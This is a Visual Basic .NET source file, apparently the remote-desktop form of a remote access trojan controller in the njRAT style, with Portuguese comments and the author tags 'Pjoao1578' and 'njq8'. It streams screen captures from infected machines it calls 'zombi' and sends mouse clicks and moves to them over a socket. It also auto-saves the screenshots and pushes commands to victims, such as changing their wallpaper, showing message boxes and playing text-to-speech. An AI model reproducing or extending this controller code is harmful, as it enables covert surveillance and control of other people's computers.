Imports System
Imports System.IO
Imports System.Net
Imports System.Net.Sockets
Imports System.ComponentModel
Imports System.Drawing.Imaging 'imagem
Imports System.Drawing.Drawing2D 'descktop
Imports Microsoft.VisualBasic.CompilerServices
Imports System.Windows.Forms.Form
Imports System.Windows.Forms
Imports System.Diagnostics
Imports Microsoft.VisualBasic
Imports System.Drawing 'imagem 
Imports System.Environment
Imports System.Windows
Imports System.Drawing.Bitmap
Imports System.Drawing.Image
Imports System.Windows.Forms.MessageBox 'para manter todas as messagebox em superior ou forme na hora de ser exebidas


'coded Py Pjoao1578
'coded By njq8
'v5
Public Class Descktop
#Region "descktop"
    Public F As Form1 '<< ?
    Public Sz As Size 'qualit imagem
    Public Sock As Integer
    Public i As Integer = 1 'contador + 1
    Dim yy As String = "||" 'yy = "||" = senha
#End Region

    Function QZ(ByVal q As Integer) As Size 'Lower Size of image
        Dim zs As New Size(Sz)
        Select Case q
            Case 0
                Return Sz
            Case 1
                zs.Width = zs.Width / 1.1
                zs.Height = zs.Height / 1.1
                Exit Select
            Case 2
                zs.Width = zs.Width / 1.3
                zs.Height = zs.Height / 1.3
                Exit Select
            Case 3
                zs.Width = zs.Width / 1.5
                zs.Height = zs.Height / 1.5
                Exit Select
            Case 4
                zs.Width = zs.Width / 1.9
                zs.Height = zs.Height / 1.9
                Exit Select
            Case 5
                zs.Width = zs.Width / 2
                zs.Height = zs.Height / 2
                Exit Select
            Case 6
                zs.Width = zs.Width / 2.1
                zs.Height = zs.Height / 2.1
                Exit Select
            Case 7
                zs.Width = zs.Width / 2.2
                zs.Height = zs.Height / 2.2
                Exit Select
            Case 8
                zs.Width = zs.Width / 2.5
                zs.Height = zs.Height / 2.5
                Exit Select
            Case 9
                zs.Width = zs.Width / 3
                zs.Height = zs.Height / 3
                Exit Select
            Case 10
                zs.Width = zs.Width / 3.5
                zs.Height = zs.Height / 3.5
                Exit Select
            Case 11
                zs.Width = zs.Width / 4
                zs.Height = zs.Height / 4
                Exit Select
            Case 12
                zs.Width = zs.Width / 5
                zs.Height = zs.Height / 5
                Exit Select
            Case 13
                zs.Width = zs.Width / 6
                zs.Height = zs.Height / 6
                Exit Select
        End Select
        zs.Width = Conversions.ToInteger((Strings.Mid(zs.Width.ToString, 1, (zs.Width.ToString.Length - 1)) & Conversions.ToString(0)))
        zs.Height = Conversions.ToInteger((Strings.Mid(zs.Height.ToString, 1, (zs.Height.ToString.Length - 1)) & Conversions.ToString(0)))
        Return zs
    End Function

    Private Sub Descktop_FormClosed(sender As Object, e As FormClosedEventArgs) Handles Me.FormClosed
        Try
            Me.p1.Image = Nothing
        Catch ex As Exception
            Me.p1.Image = Nothing
            ProjectData.SetProjectError(ex)
            ProjectData.ClearProjectError()
        End Try
    End Sub

    Private Sub Descktop_FormClosing(sender As Object, e As FormClosingEventArgs) Handles Me.FormClosing
        Try
            Me.p1.Image = Nothing
        Catch ex As Exception
            Me.p1.Image = Nothing
            ProjectData.SetProjectError(ex)
            ProjectData.ClearProjectError()
        End Try
    End Sub

    Private Sub cap_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        Try
            For i As Integer = 0 To 13 'do not muder
                Me.C1.Items.Add(QZ(i)) 'add resolusao
            Next
            For i As Integer = 1 To 5 'de 1 a 5 recomended / not user 0 a 10 /max 1 to 10
                Me.C2.Items.Add(i) 'add size
            Next
            Me.p1.Image = New Bitmap(Sz.Width, Sz.Height)
            Me.C1.SelectedIndex = 0 '0 = qualit imagem a 100%
            Me.C2.SelectedIndex = 0 '0 = qualit imagem a 100%
            Me.box1.Text = opções.ComboBox2.Text
            Me.C2.Text = opções.ComboBox1.Text
            Me.Timer3.Start() 'start chager
        Catch ex As Exception 'clean erros
            Form1.ListBox1.Items.Add("Erro Na Notificação Visual !")
            ProjectData.SetProjectError(ex)
            ProjectData.ClearProjectError()
        End Try
    End Sub

    Public Sub PktToImage(ByVal BY As Byte())
        Try
            If Me.Button1.Text = "Stop" Then
                F.s.Send(Sock, "@" & F.yy & Me.C1.SelectedIndex & F.yy & Me.C2.Text & F.yy & Me.box1.Text)
            End If
            If op = Nothing Then
            Else
                If Me.Button1.Text = "Stop" Then
                    Dim pp As New Point(0, 0)
                    pp.X = op.X
                    pp.Y = op.Y
                    op = Nothing
                    F.s.Send(Sock, "$" & F.yy & pp.X & F.yy & pp.Y & F.yy)
                End If
            End If
            Dim B As Array = fx(BY, "njq8") 'pass "njq8"
            Dim Q As New IO.MemoryStream(CType(B(1), Byte()))
            Dim L As Bitmap = Image.FromStream(Q)
            Dim QQ As String() = Split(BS(B(0)), ",")
            Dim K As Bitmap = Me.p1.Image.GetThumbnailImage(CType(Split(QQ(0), ".")(0), Integer), CType(Split(QQ(0), ".")(1), Integer), Nothing, Nothing)
            Dim G As Graphics = Graphics.FromImage(K)
            Dim tp As Integer = 0
            For i As Integer = 1 To QQ.Length - 2
                Dim P As New Point(Split(QQ(i), ".")(0), Split(QQ(i), ".")(1))
                Dim SZ As New Size(L.Width, Split(QQ(i), ".")(2))
                G.DrawImage(L.Clone(New Rectangle(0, tp, L.Width, CType(Split(QQ(i), ".")(2), Integer)), L.PixelFormat), New Point(CType(Split(QQ(i), ".")(0), Integer), CType(Split(QQ(i), ".")(1), Integer)))
                If Me.CheckBox1.Checked Then
                    Dim r As New Rectangle(Split(QQ(i), ".")(0), Split(QQ(i), ".")(1), SZ.Width, SZ.Height)
                    G.DrawRectangle(Pens.Red, r)
                End If
                tp += SZ.Height
            Next
            G.Dispose()
            Me.p1.Image = K
        Catch ex As Exception 'clean erros
            Form1.ListBox1.Items.Add("Erro Na Notificação Visual !")
            ProjectData.SetProjectError(ex)
            ProjectData.ClearProjectError()
        End Try
    End Sub

    Private Sub Button1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button1.Click
        Try
            If Me.Button1.Text = "Start" Then 'stop start capture remote descktop
                F.s.Send(Sock, "@" & F.yy & Me.C1.SelectedIndex & F.yy & Me.C2.Text & F.yy & Me.box1.Text)
                Me.Button1.Text = "Stop"
                Me.p1.Image = New Bitmap(Sz.Width, Sz.Height)
                Me.C1.SelectedIndex = 0 '0 = qualit imagem a 100%
                Me.C2.SelectedIndex = 0 '0 = qualit imagem a 100%
                If CheckBox2.Checked = True Then
                    Me.Timer4.Start()
                    Me.p1.ContextMenuStrip = Me.ContextMenuStrip 'false
                Else
                    Me.p1.ContextMenuStrip = Me.ContextMenuStrip1 'true
                End If
            Else
                Me.p1.Image = New Bitmap(Sz.Width, Sz.Height)
                Me.C1.SelectedIndex = 0 '0 = qualit imagem a 100%
                Me.C2.SelectedIndex = 0 '0 = qualit imagem a 100%
                Me.Button1.Text = "Start"
                Me.p1.ContextMenuStrip = Me.ContextMenuStrip 'false
                Me.Timer4.Stop()
            End If
        Catch ex As Exception 'clean erros
            Form1.ListBox1.Items.Add("Erro Desktop Remoto !")
            ProjectData.SetProjectError(ex)
            ProjectData.ClearProjectError()
        End Try
    End Sub
    Private Sub P1_MouseDown(ByVal sender As Object, ByVal e As System.Windows.Forms.MouseEventArgs) Handles p1.MouseDown
        If Me.CheckBox2.Checked = True Then
            Dim PP = New Point(e.X * (Sz.Width / Me.p1.Width), e.Y * (Sz.Height / Me.p1.Height))
            Dim but As Integer
            If e.Button = Windows.Forms.MouseButtons.Left Then
                but = 2
            End If
            If e.Button = Windows.Forms.MouseButtons.Right Then
                but = 8
            End If
            F.s.Send(Sock, "#" & F.yy & PP.X & F.yy & PP.Y & F.yy & but)
        End If
    End Sub
    Private Sub P1_MouseUp(ByVal sender As Object, ByVal e As System.Windows.Forms.MouseEventArgs) Handles p1.MouseUp
        If Me.CheckBox2.Checked = True Then
            Dim PP = New Point(e.X * (Sz.Width / Me.p1.Width), e.Y * (Sz.Height / Me.p1.Height))
            Dim but As Integer
            If e.Button = Windows.Forms.MouseButtons.Left Then
                but = 4
            End If
            If e.Button = Windows.Forms.MouseButtons.Right Then
                but = 16
            End If
            F.s.Send(Sock, "#" & F.yy & PP.X & F.yy & PP.Y & F.yy & but)
        End If

    End Sub
    Dim op As New Point(1, 1)
    Private Sub P1_MouseMove(ByVal sender As Object, ByVal e As System.Windows.Forms.MouseEventArgs) Handles p1.MouseMove
        If Me.CheckBox2.Checked = True Then
            If Button1.Text = "Stop" Then
                Dim PP = New Point(e.X * (Sz.Width / Me.p1.Width), e.Y * (Sz.Height / Me.p1.Height))
                If PP <> op Then
                    op = PP
                End If
            End If
        End If
    End Sub

    Private Sub CheckBox3_CheckedChanged(sender As Object, e As EventArgs) Handles CheckBox3.CheckedChanged
        'alto save tela
        If Me.CheckBox3.Checked = True Then
            Try
                Diagnostics.Process.Start(Application.StartupPath & "/Download") 'open my past Download
            Catch ex As Exception
            End Try
            Me.Timer2.Interval = Me.NumericUpDown1.Value
            Me.Timer2.Start()
        Else
            Me.Timer2.Interval = Me.NumericUpDown1.Value
            Me.Timer2.Stop()
        End If
    End Sub

    Private Sub Timer2_Tick(sender As Object, e As EventArgs) Handles Timer2.Tick 'interval 1000
        'alto save tela em png
        If i > 0 Then 'contador
            i += 1 '+ 1 + 1
        End If
        Dim pic As New SaveFileDialog
        Try
            pic.FileName = "Pic" 'name
            Me.p1.Image.Save(Application.StartupPath & "/Download\" & pic.FileName & i & ".png") 'save em my past Download
        Catch ex As Exception
        End Try
    End Sub

    Private Sub Timer1_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer1.Tick 'interval 30
        If op = Nothing Then
        Else
            If Me.Button1.Text = "Stop" Then
                Dim pp As New Point(0, 0)
                pp.X = op.X
                pp.Y = op.Y
                op = Nothing
                F.s.Send(Sock, "$" & F.yy & pp.X & F.yy & pp.Y & F.yy)
            End If
        End If
    End Sub

    Private Sub Timer3_Tick(sender As Object, e As EventArgs) Handles Timer3.Tick 'interval 100
        Me.Label1.Text = "Chagers " & Me.C2.Text
    End Sub

    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click
        'salvar imagem em .png
        Dim pic As New SaveFileDialog
        pic.Filter = "Arquivos Png|*.png"
        pic.FileName = "Pic" 'name
        If pic.ShowDialog = Windows.Forms.DialogResult.OK Then 'box dialog
            Me.p1.Image.Save(pic.FileName) 'save
        End If
    End Sub

    Private Sub SetAsToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles SetAsToolStripMenuItem.Click
        'clea set as wallpaper descktop zombi
        For Each x As ListViewItem In Form1.l1.SelectedItems 'selected zombi = true
            Form1.s.Send(Sock, "setaswallpaper" & Me.yy & Form1.s.IP(Sock)) 's.IP(Sock)) = ip do computer comando clea set as wallpaper
        Next
    End Sub

    Private Sub SendMsgboxTXTToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles SendMsgboxTXTToolStripMenuItem.Click
        'msgbox send txt
        Form1.s.Send(Sock, "txttextsend" & Me.yy & Form1.s.IP(Sock)) 'chamar
    End Sub

    Private Sub SendTXTSonidoToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles SendTXTSonidoToolStripMenuItem.Click
        'send sonido txt
        Form1.s.Send(Sock, "txtsend" & Me.yy & Form1.s.IP(Sock)) 'chamar
    End Sub

    Private Sub FunçõesToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles FunçõesToolStripMenuItem.Click
        Form1.s.Send(Sock, "fu" & Me.yy & Form1.s.IP(Sock)) 'chamar
    End Sub

    Private Sub Button3_Click(sender As Object, e As EventArgs) Handles Button3.Click
        Me.p1.Image = Nothing 'limpar tela
    End Sub

    Private Sub Panel1_MouseMove(sender As Object, e As MouseEventArgs) Handles Panel1.MouseMove
        'show
        Me.Panel1.Visible = True
    End Sub

    Private Sub Descktop_Closed(sender As Object, e As EventArgs) Handles Me.Closed
        Me.Timer2.Stop()
        Me.Timer3.Stop()
        Me.p1.Image = Nothing 'limpar tela depois de exit forme
    End Sub

    Private Sub Descktop_Closing(sender As Object, e As CancelEventArgs) Handles Me.Closing
        Me.Timer2.Stop()
        Me.Timer3.Stop()
        Me.p1.Image = Nothing 'limpar tela depois de exit forme
    End Sub

    Private Sub HideToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles HideToolStripMenuItem.Click
        'hide
        Me.Label1.Text = ""
        Me.Label1.Visible = False
        Me.Label1.Enabled = False
        Me.Timer1.Stop()
    End Sub

    Private Sub ShowToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ShowToolStripMenuItem.Click
        'show
        Me.Label1.Visible = True
        Me.Label1.Enabled = True
        Me.Timer1.Start()
    End Sub

    Private Sub HideToolStripMenuItem3_Click(sender As Object, e As EventArgs) Handles HideToolStripMenuItem3.Click
        Me.Panel1.Visible = False 'hide
        Me.box1.Visible = False
        Me.C1.Visible = False
        Me.C2.Visible = False
        Me.Button1.Visible = False
        Me.Button2.Visible = False
        Me.Button3.Visible = False
        Me.CheckBox1.Visible = False
        Me.CheckBox2.Visible = False
        Me.CheckBox3.Visible = False
        Me.NumericUpDown1.Visible = False
    End Sub

    Private Sub ShowToolStripMenuItem3_Click(sender As Object, e As EventArgs) Handles ShowToolStripMenuItem3.Click
        Me.Panel1.Visible = True 'show
        Me.box1.Visible = True
        Me.C1.Visible = True
        Me.C2.Visible = True
        Me.Button1.Visible = True
        Me.Button2.Visible = True
        Me.Button3.Visible = True
        Me.CheckBox1.Visible = True
        Me.CheckBox2.Visible = True
        Me.CheckBox3.Visible = True
        Me.NumericUpDown1.Visible = True
    End Sub
End Class